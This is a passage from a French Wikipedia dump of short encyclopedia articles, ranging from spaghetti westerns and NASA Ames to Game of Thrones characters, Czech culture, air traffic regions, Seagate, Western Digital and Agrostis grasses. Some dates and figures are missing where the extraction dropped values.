Clint Eastwood a été particulièrement influencé par le western spaghetti ; dans ses films, on retrouve des personnages complexes. Dans "Josey Wales hors-la-loi", il campe un ancien fermier dont la ferme a été détruite et la famille massacrée par une milice pro-nordiste ; ce fermier rejoindra une milice pro-sudiste et refusera la paix (dans le western traditionnel, on tait volontairement les exactions commises par les soldats de l'Union pendant la guerre de Sécession). Dans "Impitoyable" (dédié à Sergio et à Don), il est un ancien tueur qui reprend du service, le shérif de Big Whiskey est un sadique qui prend plaisir à tabasser les délinquants (alors que, dans le western traditionnel, le shérif est toujours un brave défenseur de la loi). Dans "L'épreuve de force", il joue un policier alcoolique qui doit convoyer une prostituée, témoin dans un procès.
Le genre continue d'influencer des générations de cinéastes :
Quentin Tarantino ("Django Unchained "), Sam Raimi ("Mort ou vif"), Álex de la Iglesia ("800 balles") ou Christopher McQuarrie ("Way of the Gun").
En 2004, le film "Hidalgo" était encore une transposition du western en d'autres horizons, mais le titre analogue de "western couscous" ne lui conviendrait pas.
Le genre a aussi laissé sa patte dans le monde du jeu vidéo. Le jeu "Outlaws" de Lucas Arts, sorti en 1997 en est un premier exemple, doté d'une bande-originale digne des meilleurs westerns spaghettis. D'autres jeux encore sont sortis par la suite, très influencés par le genre, tels que "Call of Juarez" et ses suites, ou "Red Dead Revolver", développé par Rockstar Games, dont les thèmes musicaux sont d'authentiques bandes originales de films. Une suite de ce jeu est sortie en 2010, appelée "Red Dead Redemption", véritable bijou vidéoludique plébiscité par la critique spécialisée et élu plusieurs fois jeu de l'année 2010.
Plébiscité par la presse spécialisée, le western spaghetti a aussi influencé la bande dessinée. Des séries telles que "Mac Coy", "Durango" (dont le premier album est un remake du "Grand Silence"), "Bouncer", "Colt Walker" (dont le héros emprunte ses traits à Clint Eastwood) proposent des personnages ambigus qui dépassent le clivage manichéen bons/méchants.

</doc>
<doc id="248881" url="https://fr.wikipedia.org/wiki?curid=248881" title="Communauté de communes de l'Arentèle-Durbion-Padozel">
Communauté de communes de l'Arentèle-Durbion-Padozel

La communauté de communes de l'Arentèle-Durbion-Padozel est une ancienne communauté de communes française, qui était située dans le département des Vosges et la région Lorraine.
Histoire.
Le , la structure fusionne avec les communautés de communes de la Vallée de la Vologne et du Canton de Brouvelieures pour donner naissance à la Communauté de communes Vologne-Durbion.
Composition.
La communauté était composée de 12 communes :

</doc>
<doc id="248882" url="https://fr.wikipedia.org/wiki?curid=248882" title="Ames Research Center">
Ames Research Center

Le est situé aux États-Unis à Moffett Field, en Californie au cœur de la Silicon Valley. Il a été créé le en tant que partie du National Advisory Committee for Aeronautics (NACA) pour assurer une supériorité militaire et civile des Américains en matière d'aviation. Par la suite, s'est orienté vers le domaine de l'exploration spatiale et les technologies de l'information. Il ne conserve qu'une activité faible dans le domaine de l'aviation.
Son nom est un hommage à Joseph Sweetman Ames, un des fondateurs du NACA.
L’Ames Research Center est un des plus importants centres de recherche et d’innovation de la Silicon Valley. Il symbolise historiquement le fameux « triangle de fer », qui a été un des piliers du développement de la Silicon Valley ; un terme qui définit les liens fonctionnels très étroits noués entre les universités, les firmes privées et le Pentagone.
Histoire.
En 1958, ce centre et les autres centres NACA sont intégrés dans l'agence spatiale de la NASA qui vient d'être créée. Le centre a d'abord joué un rôle majeur dans le développement des voilures d'avions. Par la suite, il s'est occupé de systèmes de rentrée atmosphérique, de vols hypersoniques, de protections thermiques et de robotique. Il est impliqué dans pratiquement tous les projets de sondes d'exploration spatiale au titre de concepteur ou de sous-traitant pour des équipements ou des essais.
 travaille également sur le programme spatial pour la recherche de vie dans l'univers, le développement de systèmes de survie pour les futures missions et les effets de l'espace sur l'homme.
Moyens d'essais.
Le centre possède de gros moyens d'essais pour l'aérodynamique et l'aérothermique.
Souffleries « chaudes ».
Ce type de moyen utilisant une torche à plasma (en anglais "Arc Jet" ou "Arc Heater") est destiné à l'étude des écoulements hypersoniques et des matériaux de protection thermique utilisés dans ces domaines : avion-fusée, scramjet, rentrée atmosphérique. Les essais nécessitent la création d'un gaz correspondant à une atmosphère planétaire à des températures de plusieurs milliers de degrés et des pressions faibles, ce qui entraîne généralement l'utilisation d'extracteurs. La puissance disponible sur le site pour l'alimentation des générateurs est de . Diverses installations permettent des tests de nature différente :
Tube à choc.
L"'Electric Arc Shock Tube" (EAST) est un tube à choc dans lequel la section haute pression utilise une décharge d'arc. Ce moyen permet d'améliorer la connaissance des écoulements à plusieurs milliers de degrés, en particulier du rayonnement qu'ils génèrent.
Géophysique.
La soufflerie éolienne du "Planetary Aeolian Laboratory" est destinée à l'étude des nuages de poussières sur Mars, lesquels constituent un important problème pour les atterrisseurs sur celle planète.
Technologies de l'information.
Le centre s'est très tôt doté de puissants moyens de calcul pour ses activités. Ils sont de la responsabilité de l"'Advanced Supercomputing Division" qui dispose aujourd'hui du superordinateur "Pleiades" et développe un projet de calcul distribué sur de nombreuses plates-formes, le "Nebula Cloud Computing Platform".
Le centre comporte aussi la "Human Systems Integration Division" chargée de la modélisation du comportement humain dans le domaine spatial afin d'améliorer la sécurité des vols habités et l'efficacité des systèmes homme-machine en général. Cette division comporte une centaine de personnes.
L"'Intelligent Systems Division" est chargée des robots et des systèmes autonomes, par exemple les véhicules d'exploration comme le "Mars Exploration Rover". Pour améliorer l'efficacité et la sureté des codes utilisés dans les divers systèmes embarqués ou au sol elle fait appel à diverses méthodes comme la vérification de modèles ou l'apprentissage automatique. Cette équipe étudie également les relations entre les diverses équipes impliquées dans un projet.
Éducation.
Le centre s'est très tôt impliqué dans la diffusion des connaissances, d'abord en créant le "NASA Ames Exploration Center", un musée contenant tous les aspects de l'exploration spatiale.
En 1999 a été créé le "Robotics Education Project", aujourd'hui "Robotics Alliance Project", pour permettre la compétition en la matière.
Plus récemment, est à l'origine du projet "Learning Technologies". Ce programme, qui s'adresse aux élèves des écoles et leurs enseignants a pour objectif de permettre l'accès au plus grand nombre aux domaines mathématiques et scientifique. Pour cela, sont mis à disposition plusieurs outils puissants et gratuits dont :

</doc>
<doc id="248883" url="https://fr.wikipedia.org/wiki?curid=248883" title="Lyanna Stark">
Lyanna Stark

Lyanna Stark est un personnage fictif de la série de livres "Le Trône de fer" écrite par George R. R. Martin et de son adaptation télévisuelle ", interprétée par les actrices Cordelia Hill (enfant) et par Aisling Franciosi (adulte).
Présentation.
Lyanna Stark est la seule sœur d'Eddard Stark, Benjen Stark et Brandon Stark. Elle meurt, à , en donnant naissance à son fils Jon Snow.
Dans les livres, elle est décrite par son frère Eddard Stark.
Lors d'un tournoi de Harrenhall, le plus grand tournoi de l'histoire à Westeros, Lyanna est choisie par le champion du tournoi, le prince héritier Rhaegar Targaryen, comme . Comme Rhaegar est déjà marié et que Lyanna est fiancée à Robert Baratheon, le fait que Rhaegar fait la cour à Lyanna est considéré comme un scandale à l'époque. Un an plus tard, elle s'enfuit avec Rhaegar dont elle est amoureuse, et l'épouse, ce qui est un des déclenchements de la guerre civile qui aboutit au renversement de la Maison Targaryen. À la fin de la guerre, Eddard et six de ses compagnons s'aventurent dans la Tour de la Joie à Dorne, où Lyanna est gardée par trois des plus importants chevaliers de la Garde Royale 

</doc>
<doc id="248884" url="https://fr.wikipedia.org/wiki?curid=248884" title="Communauté de communes de l'ADP">
Communauté de communes de l'ADP



</doc>
<doc id="248885" url="https://fr.wikipedia.org/wiki?curid=248885" title="Robb Stark">
Robb Stark



</doc>
<doc id="248888" url="https://fr.wikipedia.org/wiki?curid=248888" title="Culture de la Tchéquie">
Culture de la Tchéquie

La culture de la Tchéquie, pays enclavé de l'Europe centrale, désigne d'abord les pratiques culturelles observables de ses habitants (, estimation 2020).
La culture de la Tchéquie présente de nombreuses similitudes avec les cultures de ses voisins allemand et autrichien (cuisine à base de porc/chou/pomme de terre, importance de la musique, fête de la Saint-Nicolas…), elle représente la partie la plus occidentale du monde slave, dont elle tire aussi une part importante de son folklore, de ses mythes fondateurs et de ses traditions.
Traditions.
Folklore.
Une tradition de Pâques fait qu'en Tchéquie, les garçons fouettent les filles avec des bâtons d'osier tressé ornés de rubans colorés. Les filles leur offrent en échange des œufs peints. Le lendemain, ces dernières cherchent en contrepartie à arroser les garçons d'eau froide. Cette tradition païenne liée au renouveau printanier et à la fertilité a été « récupérée » par l'Église qui a fait coïncider la date avec celle des Pâques chrétiennes. Plus tard, les communistes n'ont pas touché à cette pratique, mais l'ont au contraire encouragée. Enfin, l'économie de marché actuelle favorise la commercialisation de fouets de pâques et œufs peints, au même titre qu'elle mercantilise le Noël.
Santé.
La Tchéquie détient le record de la consommation de cannabis dans l'Union européenne en 2005 : selon le web du "Courrier International" (), 24 % de la population consomme régulièrement du cannabis.
Artisanat.
Les savoir-faire liés à l’artisanat traditionnel relèvent (pour partie) du patrimoine culturel immatériel de l'humanité. On parle alors de trésor humain vivant.
Mais une grande partie des techniques artisanales ont régressé, ou disparu, dès le début de la colonisation, et plus encore avec la globalisation, sans qu'elles aient été suffisamment recensées et documentées.
Arts du spectacle.
Musique.
Le pays compte une formation symphonique de renommée internationale, l'Orchestre philharmonique tchèque, basé à Prague.
Autres scènes : marionnettes, mime, pantomime, prestidigitation.
Les arts mineurs de scène, arts de la rue, arts forains, cirque, théâtre de rue, spectacles de rue, arts pluridisciplinaires, performances manquent encore de documentation pour le pays …
Pour le domaine de la marionnette, la référence est : Arts de la marionnette en Tchéquie, sur le site de l'Union internationale de la marionnette UNIMA).
En 2016, le est inscrit sur la liste représentative du patrimoine culturel immatériel de l'humanité.
Patrimoine culturel.
La liste du patrimoine mondial en Tchéquie de l'UNESCO inclut les sites tchèques suivants :
Liste représentative du patrimoine culturel immatériel de l’humanité.
Le programme Patrimoine culturel immatériel (UNESCO, 2003) a inscrit dans sa liste du patrimoine culturel immatériel de l'humanité en Tchéquie :
Registre international Mémoire du monde.
Le programme Mémoire du monde (UNESCO, 1992) a inscrit dans son registre international Mémoire du monde (au 10/01/2016) :

</doc>
<doc id="248890" url="https://fr.wikipedia.org/wiki?curid=248890" title="Comté de Bristol (Massachusetts)">
Comté de Bristol (Massachusetts)

Le comté de Bristol est un comté situé dans le Commonwealth du Massachusetts aux États-Unis. Au recensement de 2010, sa population s'élevait à personnes. Le chef-lieu est Taunton. Le haut shérif du comté de Bristol est actuellement Thomas M. Hodgson, un républicain de Fall River.
Le comté s'étend sur 1 790 km². Il fait partie de l'aire métropolitaine de Providence.

</doc>
<doc id="248892" url="https://fr.wikipedia.org/wiki?curid=248892" title="Rétro-pompage">
Rétro-pompage

Il est dit d'un oléoduc qu'il peut être utilisé en rétropompage quand cet oléoduc est équipé de stations de compression permettant d'inverser le sens de la compression. En effet, pour pomper le fluide en sens inverse du sens normal d'écoulement il faut que les compresseurs utilisés fonctionnent dans les deux sens, le côté aspiration devient côté refoulement et vice versa.
Le changement de direction du flux d'un pipeline peut avoir des répercussions géopolitiques importantes pour les pays à qui le pétrole était initialement destiné.

</doc>
<doc id="248893" url="https://fr.wikipedia.org/wiki?curid=248893" title="Région d'information de vol">
Région d'information de vol

Une région d'information de vol (ou FIR, de l'anglais "Flight Information Region") est un espace aérien de dimensions définies à l'intérieur duquel le service d'information de vol et le service d'alerte sont assurés.
L'espace aérien d'un pays peut être divisé en une ou plusieurs FIR, de même qu'une FIR peut couvrir plusieurs pays.
L'Organisation de l'aviation civile internationale (OACI) attribue à chaque FIR un code à quatre lettres dont les deux premières sont liées à la situation géographique de la FIR (voir la liste des codes OACI des aéroports).
Les FIR françaises.
En espace aérien inférieur, c'est-à-dire au-dessous du FL 195, il y a 5 FIR en France métropolitaine et 2 FIR en France d'outre-mer.
En espace aérien supérieur, c'est-à-dire au-dessus du FL 195, il y a une région d'information de vol (UIR) en France métropolitaine .
La FIR suisse.
Il n'existe qu'une seule FIR en Suisse qui s'étend du sol au FL 195. Son code est LSAS. Elle est divisée en deux secteurs (FIS) :
De plus, une ligne horizontale sépare la FIR, grosso modo de Montreux à la pointe sud-est du Bodensee, formant ainsi une zone Jura-Plateau suisse et une zone Alpes.
Cette FIR déborde légèrement des frontières nationales et englobe le Liechtenstein.
La FIR Belgique &amp; Luxembourg.
La Belgique et le Luxembourg font partie de la même FIR basée à Bruxelles sous le code EBBU.
Les FIR canadiennes.
Le Canada est divisé en 7 FIR :

</doc>
<doc id="248894" url="https://fr.wikipedia.org/wiki?curid=248894" title="Thomas Morley">
Thomas Morley

Thomas Morley (v. 1557 à Norwich - octobre 1602 à Londres) est un organiste, compositeur et théoricien anglais de la Renaissance.
Biographie.
Fils d'un brasseur, il reçoit son éducation musicale à la cathédrale de Norwich (Est-Anglie), dont il devient maître du chœur en 1583. Diplômé d'Oxford (licencié) en 1588, il est également l'élève du grand compositeur élisabethain William Byrd, qui compléta sa formation musicale. En 1589, il accepte le poste d'organiste de la cathédrale Saint-Paul de Londres. À partir de 1593, à la suite de Byrd, il devient "gentleman" de la Chapelle Royale.
Morley diffusa en Angleterre le madrigal italien. Son ballet "Now is the Month of Maying", inspiré d'une "canzonetta" d'Orazio Vecchi, montre clairement l'influence du compositeur italien Giovanni Giacomo Gastoldi. 
Il explique aussi sa conception de la musique dans un traité, "A Plaine and Easie Introduction to Practicall Musicke", dédié à Byrd, qui paraît en 1597.
Pendant sa fructueuse carrière, il écrit plusieurs fantaisies pour le virginal ou le clavecin, ainsi que des canzones et des pièces de ballet et instrumentales. Dans ses pièces vocales profanes, Morley met de préférence en musique certains des "Sonnets" de Shakespeare.
Son madrigal le plus connu, et l'un de ses plus courts, demeure "", publié en 1594. Le recueil "The Triumphs of Oriana" (1601) contient deux madrigaux plus étendus : "Arise, awake" et "Hard by a Crystal Fountain". 

</doc>
<doc id="248902" url="https://fr.wikipedia.org/wiki?curid=248902" title="Argumentum ad consequentiam">
Argumentum ad consequentiam

L’argument par la conséquence, en , est un raisonnement fallacieux. Il consiste à déduire une conclusion (en général une croyance) à partir d'une conséquence, positive ou négative, de la croyance à prouver.
Cette erreur vient du fait que l'on refuse d'admettre les conséquences désagréables d'une proposition, même si elle est vraie. Ou à l'inverse qu'on est tenté d'accepter les conséquences agréables d'une proposition fausse. Mais les conséquences agréables ou désagréables ne constituent pas une preuve.
Exemples.
Analyse de cette dernière affirmation."
"Proposition A : « Dieu n'existe pas. »" "Proposition B : « Les croyants prient pour rien. »"
"Proposition A : « La gravité n'existe pas. »" "Proposition B : « Les scientifiques travaillent pour rien. »"
Voir aussi.
Articles connexes.
Sous-catégorie.
L"'argumentum ad baculum" est un cas spécial de l'argument par la conséquence.

</doc>
<doc id="248904" url="https://fr.wikipedia.org/wiki?curid=248904" title="Sansa Stark">
Sansa Stark

Sansa Stark est l'un des personnages principaux de la saga "Le Trône de fer" écrite par George R. R. Martin. Elle est la fille aînée de lord Eddard Stark et de lady Catelyn Tully. C'est une jeune fille rêveuse et naïve, qui aime les joutes, les fêtes et les histoires de preux chevaliers et de princesses. Gracieuse et rêvant de chevalerie et du prince charmant des chansons, Sansa est belle, avec des cheveux auburn, des pommettes racées et des yeux d'un bleu profond, et alors qu'elle grandit acquiert une silhouette haute et élancée. Elle excelle dans de multiples disciplines, telles que coudre, chanter, jouer d'instruments de musiques, et les bonnes manières. Elle s'entend mal avec sa sœur Arya, dont les intérêts sont complètement opposés. Son loup se nomme "Lady".
Histoire.
Dans la série.
Saison 1.
Sansa est la fille aînée du gouverneur du Nord et réside à Winterfell avec sa famille lorsqu'elle apprend que le roi Robert Baratheon est en route pour nommer son père Main du Roi. À l'arrivée de la famille royale, Sansa est promise à Joffrey et se rend donc à Port-Réal avec son père Eddard Stark et sa petite sœur Arya. Elle qui ne rêvait que de preux chevaliers et de damoiselles de haut lignage trouvant le grand amour, mais elle voit ses illusions voler en éclats lorsque, à la mort du roi, son père est arrêté et accusé de haute trahison, sa sœur prend la fuite et le reste de la maisonnée les ayant accompagné à la capitale est massacré. Elle est la seule à être épargnée, utilisée comme bouclier, otage et monnaie d'échange potentielle lorsque parvient à Port Réal la nouvelle que Robb, son frère aîné, a décidé de soulever les armées du Nord en réponse à l'insulte faite au nom de Stark. Le summum de l'horreur est atteint pour Sansa lorsque son père est exécuté sous ses yeux sur ordre de son fiancé Joffrey. 
Saison 2.
Désormais otage des Lannisters, Sansa subit les brimades quotidiennes de son fiancé devenu roi tyrannique, qui n'hésite pas à la faire battre par sa Garde Royale. Surveillée et humiliée, ses rares instants de paix sont auprès de Tyrion, malgré sa haine pour la famille de ce dernier, et à quelques occasions Peter Baelish. Durant la Bataille de la Néra, au cours de laquelle Stannis tente de s'emparer de Port-Réal, Sansa, Cersei et toutes les autres femmes sont retranchées dans le Donjon Rouge tandis que Tyrion mène les armées avec le Limier et Lancel Lannister. Sansa s'inquiète de la présence d'Ilyn Payne, l'homme qui a tué son père, dans la pièce avec elles, et Cersei lui révèle qu'il est là pour les tuer avant qu'elles ne soient violées par les armées adverses si jamais ces dernières devaient gagner la bataille. 
Saison 3.
À l'issue de la Bataille de la Néra, les fiancailles de Sansa et Joffrey sont rompues afin de privilégier une alliance matrimoniale avec Margaery Tyrell. C'est un soulagement indicible pour Sansa, qui espère voir sa situation commencer à s'améliorer. Elle sait cependant sa position toujours précaire, et n'hésite ainsi pas à refuser l'offre de Peter Baelish, qui lui suggère de l'aider à fuir Port Réal. Il compte en effet l'emmener avec lui aux Eyriés, où il doit épouser Lysa Arryn, la tante de la jeune fille. 
Parallèlement à tout cela, Sansa fait la connaissance de Margaery et de sa redoutable grand-mère, Olenna Tyrell. Ces dernières questionnent Sansa pour connaître le véritable caractère du roi, et la jeune fille finit par craquer, révélant que Joffrey est un monstre. Les Tyrell entreprennent alors de proposer à Sansa d'épouser Loras, le frère de Margaery, sous couvert de lui offrir une échappatoire. En effet, tout enfant auquel la jeune fille donnerait naissance aurait possiblement un droit d'héritage sur Winterfell, et garantirait donc un contrôle des Terres du Nord, quelque chose auquel les ambitieux Tyrell ne peuvent résister. Le plan tombe à l'eau cependant, lorsque Tywin Lannister, père de la reine Cersei et Main du Roi, est averti de leurs machinations et marie la jeune fille à son propre fils cadet, Tyrion. Ce dernier, outré des agissements de son père et plein de pitié envers Sansa, qui est beaucoup plus jeune que lui et traumatisée, refusera catégoriquement de consommer leur union. 
Lorsque Sansa apprend le sort terrible réservé à son frère aîné Robb et à sa mère Catelyn aux Noces Pourpres, c'est un nouveau coup terrible pour la jeune fille déjà bien éprouvée. 
Saison 4.
Joffrey est tué à son propre mariage par un empoisonnement, tout le monde croit que c'est Tyrion mais c'est Olenna Tyrell qui a organisé le meurtre avec Petyr Baelish et puisque Sansa est la femme de Tyrion, Baelish sait qu’elle sera tuée donc il demande à Dontos Hollard de la faire évader. Lorsqu'ils s'enfuient de Port Réal, le bouffon est tué par Littlefinger car celui sait qu’il va tout dire à Cersei , Baelish et Sansa sont au Éyriés où Sansa rencontre sa tante Lysa Arryn et son fils Robin Arryn, Lysa est promise à Petyr mais celui-ci a embrassé Sansa et Lysa folle de jalousie s'apprête à pousser la jeune fille par la Porte de Lune mais Littlefinger lui révèle qu'il a toujours aimé Catelyn et la pousse. Sansa et Petyr doivent passer devant les seigneurs du royaume pour témoigner sa mort.
Dans les romans.
Lorsque son père est nommé Main du Roi de Robert Baratheon, Sansa doit accompagner celui-ci à la capitale du royaume, Port-Réal. Sansa adore la vie à la cour qu'elle idéalise, et elle est probablement la seule Stark heureuse d'aller à Port-Réal. Elle est en même temps promise à Joffrey Baratheon, l'héritier du trône qui correspond tout à fait à son image du prince charmant aux cheveux d'or. Leur relation devient pourtant tendue après une altercation entre Arya et le prince, et le loup-garou de Sansa, "Lady" est exécuté en lieu et place de la "Nymeria" d'Arya. Malgré tout, elle reste profondément éprise du prince.
Par la suite, lorsqu'Eddard s'arrange pour permettre à ses filles de s'enfuir vers le Nord, Sansa va voir la reine Cersei, confiante, informant ainsi Cersei du fait qu'Eddard est sur le point de mettre ses filles à l'abri. Eddard est emprisonné, et en dépit des supplications de Sansa et des conseils de Cersei, est exécuté par Joffrey. Devenu roi, il entame un règne de terreur, une partie de ses caprices visant à battre Sansa régulièrement, et celle-ci abandonne vite ses illusions à son sujet. En dépit de tout ce qu'elle peut subir, Sansa demeure courtoise envers tous, y compris Sandor Clegane, le garde du corps de Joffrey, tour à tour brutal et doux avec elle. Il se prend d'affection pour elle, essayant autant que possible de la protéger des colères de Joffrey, et lui sauve plusieurs fois la vie. Lors de la bataille de la Néra, il vient la trouver dans sa chambre et lui propose de l'emmener avec lui alors qu'il part vers le Nord, mais Sansa refuse, effrayée. À la cour, elle apprend à mentir efficacement pour rester en vie.
Les Tyrell conspirent pour la marier à Willos Tyrell afin de la sauver - stratégiquement parlant, Sansa est la clé du Nord en tant qu'unique héritière de son frère Robb Stark, mais ils se font devancer par les Lannister, qui la marient à Tyrion Lannister, dit le Lutin, dans le but de s'approprier Winterfell ; ce mariage ne sera pas consommé, Tyrion refusant d'avoir des relations sexuelles avec une enfant de quatorze ans. Horrifiée par sa laideur et haïssant les Lannister après la mort des siens, Sansa cache tout de même ses sentiments et se réfugie derrière ses politesses.
Sansa est alors contactée par un mystérieux chevalier qui se propose de l'aider à s'évader. Ce dernier s'avère en fait être ser Dontos Hollard, ivrogne notoire destitué de son rang de chevalier et devenu bouffon. Ils se voient régulièrement au bois sacré, et le soir de l'assassinat de Joffrey, auquel Sansa participe involontairement, il profite du chaos général pour la faire embarquer sur un bateau dirigé par Littlefinger, auquel il obéissait en réalité. Littlefinger s'assure de son silence en le tuant et emmène Sansa aux Eyrië, faisant passer la fugitive pour sa fille bâtarde, Alayne Stone. Celle-ci assiste au mariage de Littlefinger avec sa tante Lysa Arryn, à qui est révélée la véritable identité de la soi-disant bâtarde. Dans le jardin des Eyrié, Littlefinger, attiré à la fois par sa beauté et par le fait qu'elle soit la fille de Catelyn, embrasse Sansa. Surprenant cette scène, Lysa, furieuse et ivre, la menace et tente de la tuer, mais Littlefinger intervient, et assassine son épouse en la jetant du haut de la Porte de Lune, faisant accuser un troubadour du meurtre.
Après la mort de Lysa, Alayne devient la maîtresse des Eyrié, démontrant son aptitude à diriger une maisonnée, et apprend de Littlefinger les subtilités du pouvoir. Littlefinger prévoit de la marier à Harrold Hardyng, l'héritier de la maison Arryn et cousin de Robert, et de révéler en même temps sa véritable identité d'héritière de Winterfell, afin que les forces du Val épargnées par la guerre récupèrent son héritage.
Concept et création.
C'est Sophie Turner qui a été choisie pour incarner Sansa Stark dans la série télévisée adaptée des romans. Elle a 13 ans au lieu de 11 au début de la série. Dans la série, elle est mariée à Ramsay Bolton à partir de la saison 5 par Littlefinger.
Costumes.
Les costumes de Sansa, réalisés par la costumière Michele Clapton, évoluent au fur et à mesure de la série, représentant les changements dans la vie de la jeune fille. Au début de la saison 1, elle porte des robes de laine assez simples dans leur coupe, dans des tons de bleu, dont le col présente une rangée de nœuds, comme sur les robes de sa mère et de sa petite sœur. Après son déménagement à Port-Réal, ses tenues évoluent peu à peu, sous l’influence de la mode de la cour, guidée par Cersei Lannister, puis Margaery Tyrell : cela se remarque par l’apparition de broderies (principalement de libellules, de fleurs ou de papillons, représentant la fragilité), et de manches longues et amples comme celles de la reine Cersei, dans un premier temps, puis par les encolures de plus en plus profondes lorsque Margaery devient reine. Les étoffes évoluent aussi vers des tissus plus légers, adaptés au climat du Sud de Westeros. La robe portée pour son mariage avec Tyrion Lannister met en valeur une bande brodée qui s’enroule autour de son corps et symbolise son enfermement par la famille régnante.

</doc>
<doc id="248905" url="https://fr.wikipedia.org/wiki?curid=248905" title="Seagate Technology">
Seagate Technology

Seagate Technology est une société américaine fondée en 1979 (sous le nom de Shugart Technology) et située à Scotts Valley, en Californie. Seagate développe et produit des disques durs et en est actuellement l'un des principaux constructeurs, derrière Western Digital.
Ses sites de recherche et développement et entrepôts sont situés dans la Silicon Valley, à Pittsburgh en Pennsylvanie, à Longmont dans le Colorado, à Bloomington et à Shakopee dans le Minnesota, à Springtown en Irlande du Nord et, enfin, à Singapour.
Historique.
Fondée sous le nom de Shugart Technology par Alan Shugart — qui s'était fait éjecter de Shugart Associates — et Finis Conner cette société a été l'inventeur du ST-506, le premier disque dur 5"¼ pour ordinateur; plus récemment la société fabrique les disques durs embarqués dans la PlayStation 3 de Sony, la Xbox de Microsoft, ou encore le Zen de Creative Labs.
Le , Seagate annonce le rachat, en actions, pour 1,9 milliard de dollars de son concurrent américain Maxtor et sa fusion au sein de l'entreprise.
Au terme de la transaction, les actionnaires de Maxtor possèdent 16 % du capital de la société issue de la fusion.
En avril 2008, Seagate annonce la commercialisation de son milliardième disque dur.
Samsung vend sa division "disques durs" à Seagate en . Ce rachat est validé par la Commission européenne le , la Commission ne considérant pas le rachat de cette division comme susceptible de troubler le jeu de la concurrence sur le marché du stockage.
En 2012, Seagate rachète LaCie.
En , Seagate acquiert SandForce, la division des contrôleurs pour SSD d'Avago Technologies, pour de dollars.
En avril 2023, la filiale singapourienne du groupe, a continué de vendre du matériel à Huawei, sans autorisation préalable du Bureau of Industry and Security. Or Huawei est sous embargo américain depuis août 2020. Seagate a donc écopé d'une amende de 300 millions de dollars.
Parts de marché.
En additionnant les parts de marché des deux groupes (28,7 % pour Seagate et 14,1 % pour Maxtor) en 2005, Seagate produisait près de 43 % des disques durs dans le monde, 37 % en 2006.
Il devient le numéro deux mondial au début de 2010, derrière Western Digital, après avoir dominé le marché depuis plusieurs années. de disques ont été vendus au cours du dernier trimestre 2010, contre pour Western Digital.
Ses principaux concurrents sont Western Digital, Hitachi GST (racheté le par Western Digital), Toshiba et Fujitsu.
Sites de production.
Seagate a installé en 1993 son usine de production de semi-conducteurs à Springtown, non loin de Derry en Irlande du Nord. Avec ses 1400 salariés, c’est le plus grand site de fabrication de semi-conducteurs au monde. de têtes de disques durs (soit 25 % de la production mondiale) proviennent de cette usine de Springtown chaque année. Seagate possède également un site de production de têtes de lectures au Minnesota.
En Chine, l'usine Seagate se situe à Wuxi (ouverte en 1995). L'usine de Wuxi est le plus grand site de production de disques durs de la compagnie.
Les autres sites de production de disques se situent aux États-Unis, Irlande du Nord, Malaisie, Thaïlande, et à Singapour.
En 2007, Seagate ferme son usine irlandaise de Limavady, dans le comté du Derry, ce qui entraîne le licenciement de .
En 2009, Seagate ferme son usine de Singapour (quartier d'Ang Mo Kio), licenciant . En 2011, Seagate revend les bâtiments industriels pour 91,5 M S$.
En 2017, Seagate annonce la fermeture de son usine de Suzhou, acquise lors du rachat de Maxtor en 2006.
Données boursières.
Seagate est coté au NASDAQ.
Actionnaires.
Liste des principaux actionnaires au :

</doc>
<doc id="248907" url="https://fr.wikipedia.org/wiki?curid=248907" title="Argument par la conséquence">
Argument par la conséquence



</doc>
<doc id="248908" url="https://fr.wikipedia.org/wiki?curid=248908" title="Western Digital">
Western Digital

Western Digital Corporation, également désigné par son sigle WD ou WDC, est une société américaine de fabrication de matériel informatique. Elle a été fondée en 1970 et a commencé à concevoir et fabriquer des disques durs en 1988. 
Western Digital est réputé pour avoir sorti le seul disque dur SATA grand public tournant à : le WD Raptor, suivi par le VelociRaptor.
Histoire.
En 2008, Western Digital licencie et ferme une de ses trois usines en Thaïlande pour faire face à la récession économique.
Le , Western Digital rachète la division disques durs d'Hitachi (Hitachi Global Storage Technologies) pour un montant de de dollars. 
En , Western Digital acquiert pour de dollars SanDisk, dans le but de renforcer ses activités dans la mémoire flash .
En 2025, dans l'optique de se recentrer sur l'activité des disques durs, Western Digital a annoncé s'être séparé de SanDisk.
Gammes de produits.
Disques durs externes.
2,5".
En , Western Digital prépare la sortie du My Passport Studio de au format qui pèse et s’affiche en précommande chez certains marchands en Europe à partir de .
3,5".
- MCP-1600
SSD NVME.
Western Digital développe également des SSD NVME aussi bien interne qu'en externe. Ces supports de stockage ont pour avantage de proposer de meilleurs débits, tout en étant plus résistants qu'un disque dur mécanique classique.
Sites de production.
La plupart des sites de production de l'entreprise se situent en Thaïlande (à Bang Pa-In et à Prachinburi) et en Malaisie.
Western Digital s'est associé à Toshiba pour construire une usine de mémoires flash 3D au Japon, à Yokkaichi, la mise en service est prévue pour 2018. En 2019, cette usine représente 35 % de la production mondiale de mémoire flash NAND.
En 2018, Western Digital annonce la fermeture de son usine de disques durs située en Malaisie d'ici fin 2019.
Actionnaires.
Liste des principaux actionnaires au :

</doc>
<doc id="248910" url="https://fr.wikipedia.org/wiki?curid=248910" title="Agrostis">
Agrostis

Agrostis est un genre de plantes monocotylédones de la famille des "Poaceae" (graminées), à distribution sub-cosmopolite, qui comprend environ 220 espèces des régions tempérées et froides. 
Plusieurs espèces de ce genre sont parfois employées dans les mélanges comme plantes fourragères pour prairies ou pâtures. Cependant, quoique les Agrostis puissent être recommandables dans certaines conditions spéciales, on ne peut guère les considérer comme étant d'excellentes graminées fourragères.
D'autres espèces telles que l'Agrostide ténue et l'Agrostide stolonifère sont utilisées pour les gazons d'agrément et certains terrains de sport (green de golf).
Elles sont toutes plus ou moins traçantes et envahissantes et peuvent devenir de véritables mauvaises herbes, vivant au détriment des plantes voisines, à la fois plus délicates et plus riches en principes nutritifs. Cette fâcheuse particularité des Agrostis est si bien connue qu'on les appelle quelquefois, à tort, « chiendent ». On leur donne aussi les noms vulgaires de « traînasse » ou « terrenne ».
Caractéristiques générales.
